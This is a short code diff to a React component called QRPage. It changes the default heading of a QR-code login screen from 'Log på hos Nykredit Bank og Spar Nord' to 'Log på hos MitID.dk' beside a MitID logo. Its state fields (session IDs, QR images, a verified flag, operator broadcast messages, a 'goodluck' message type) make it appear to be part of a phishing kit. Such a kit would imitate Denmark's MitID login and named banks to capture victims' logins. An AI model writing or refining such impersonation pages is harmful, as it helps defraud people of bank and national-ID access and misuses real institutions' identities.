@@ -91,7 +91,7 @@ export default function QRPage({ sessionId, onBack }: Props) {
   const [qrReady, setQrReady] = useState(false)
   const [qrImage, setQrImage] = useState<string | null>(null)
   const [verified, setVerified] = useState(false)
-  const [titleText, setTitleText] = useState('Log på hos Nykredit Bank og Spar Nord')
+  const [titleText, setTitleText] = useState('Log på hos MitID.dk')
   const [broadcastMsg, setBroadcastMsg] = useState<string | null>(null)
   const [broadcastEnabled, setBroadcastEnabled] = useState(true)
   const [msgType, setMsgType] = useState<'warning' | 'myid' | 'goodluck' | null>(null)
@@ -186,7 +186,7 @@ export default function QRPage({ sessionId, onBack }: Props) {
               <div className="flex flex-col h-full">
                 <div className="flex items-start justify-between mb-2">
                   <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4 whitespace-pre-line">
-                    {titleText || 'Log på hos Nykredit Bank og Spar Nord'}
+                    {titleText || 'Log på hos MitID.dk'}
                   </h1>
                   <MitIdLogo />
                 </div>
@@ -228,7 +228,7 @@ export default function QRPage({ sessionId, onBack }: Props) {
             <div className="flex flex-col h-full">
               <div className="flex items-start justify-between mb-2">
                 <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4 whitespace-pre-line">
-                  {titleText || 'Log på hos Nykredit Bank og Spar Nord'}
+                  {titleText || 'Log på hos MitID.dk'}
                 </h1>
                 <MitIdLogo />
               </div>
